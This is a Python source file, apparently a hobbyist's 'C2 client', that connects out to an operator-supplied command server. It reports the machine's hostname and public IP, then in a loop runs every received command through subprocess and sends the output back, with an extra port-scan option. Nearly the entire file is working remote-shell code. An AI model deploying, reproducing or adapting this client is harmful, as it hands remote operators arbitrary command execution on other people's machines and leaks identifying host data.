# ==================================================================================================================== #
# Version 1.2.0 of my C2 Client!                                                                                       #
# Made by Eric E. Github: https://github.com/EricEsquivel                                                              #
# ==================================================================================================================== #

import socket, requests, sys, subprocess, re
import hostportscanner


def usage():
    print("""
    usage: server.py <ip> <port>
    """)
    sys.exit()


def get_public_ip():
    response = requests.get('https://api.ipify.org').text
    return response

def send_to_server(stuffhere):
    stuffhere = stuffhere.encode("utf-8")
    s.send(stuffhere)


# Run checks
if len(sys.argv) == 1:
    print("Missing arguments. Looking for ip and port")
    usage()
    sys.exit()
elif len(sys.argv) == 2:
    if sys.argv[1] == "help" or sys.argv[1] == "-h" or sys.argv[1] == "--help":
        usage()
        sys.exit()
    print("Missing arguments. Looking for a port")
    usage()
    sys.exit()
elif len(sys.argv) > 3:
    print("Too many arguments!")
    usage()
    sys.exit()
else:
    pass


ip = sys.argv[1]
try:
    port = int(sys.argv[2])
    if port not in range(1,65536):
        raise Exception
except ValueError:
    print("Port given is not an integer")
    usage()
except:
    print("Port given is not in range!")
    usage()


cmdserver_ip = sys.argv[1]
try:
    cmdserver_port = int(sys.argv[2])
    if cmdserver_port not in range(1,65536):
        raise Exception
except ValueError:
    print("Port given is not an integer")
    usage()
except:
    print("Port given is not in range!")
    usage()
serveraddress = (cmdserver_ip,cmdserver_port)


s = socket.socket()
try:
    s.connect((serveraddress))
except Exception as er:
    er = re.sub(r"\[.+\]", "", str(er)).strip()
    print(er)
    usage()


# ------------------------------------#

hostname = (socket.gethostname())
public_ip = get_public_ip()
client_send = (f"Client {hostname}, {public_ip} joined.").encode("utf-8")
s.send(client_send)
while True:
    command = s.recv(1024).decode("utf-8")
    if command == "stopall":
        break
    elif command == "portscan":
        send_to_server("Initiating port scan. This will take a minute.")
        hostportscanner.main()
        open_ports = str(hostportscanner.open_ports)
        time_passed = str(hostportscanner.timepassed)
        send_to_server(f"Client {hostname}, {public_ip} has open ports: {open_ports}. Process took {time_passed}s.")
    elif command == "openports":
        try:
            send_to_server(f"{hostname}, {public_ip} has open ports: {open_ports}")
        except NameError:
            send_to_server("Run port scan before running this command!")
    else:
        output = subprocess.getoutput(command)
        send_to_server(f"{hostname}, {public_ip}: {output}")
    
print("Stop device initiated. Disconnecting")
s.close()